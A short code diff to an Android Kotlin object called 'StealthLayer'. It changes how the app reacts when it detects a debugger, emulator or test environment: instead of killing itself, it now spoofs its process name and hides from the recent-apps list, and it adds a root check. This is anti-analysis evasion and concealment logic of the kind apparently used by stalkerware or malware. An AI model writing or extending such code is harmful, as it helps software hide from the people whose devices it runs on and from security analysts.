@@ -17,18 +17,14 @@ object StealthLayer {
         if (stealthInitialized) return
         stealthInitialized = true
 
-        if (isBeingDebugged()) {
-            android.os.Process.killProcess(android.os.Process.myPid())
-            return
-        }
+        val debug = isBeingDebugged()
+        val emu = isEmulator()
+        val test = isRunningInTestEnvironment()
+        val root = isRooted()
 
-        if (isEmulator()) {
-            android.os.Process.killProcess(android.os.Process.myPid())
-            return
-        }
-
-        if (isRunningInTestEnvironment()) {
-            android.os.Process.killProcess(android.os.Process.myPid())
+        if (debug || emu || test) {
+            spoofProcessName()
+            hideFromRecentApps(context)
             return
         }
 
